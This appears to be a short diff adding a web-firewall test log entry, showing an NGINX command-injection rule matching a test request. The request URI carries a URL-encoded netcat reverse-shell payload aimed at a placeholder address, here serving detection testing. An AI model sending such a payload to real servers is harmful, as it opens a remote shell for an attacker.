@@ -1,0 +1,3 @@
+Expected Rule: [NGINX CMDi] Advanced command injection attempt
+Matched Rule: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1769348779357-lyp34e pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
+Rule Match: ✅ Match
